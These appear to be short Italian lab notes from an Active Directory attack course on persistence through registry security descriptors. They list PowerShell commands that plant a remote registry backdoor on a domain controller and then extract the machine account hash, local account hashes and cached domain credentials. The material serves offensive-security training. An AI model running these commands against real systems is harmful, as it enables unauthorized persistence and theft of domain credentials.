# Persistence using ACLs - Security Descriptors - Remote Registry

* Utilizzare RACE o DAMP, con privilegi admin sulla macchina remota

```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```

* Come studentx, recupera l'hash del host

```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

* Recuperare l'hash dell'account locale

```powershell
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

* Recuperare le credenziali di dominio cached

```powershell
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```
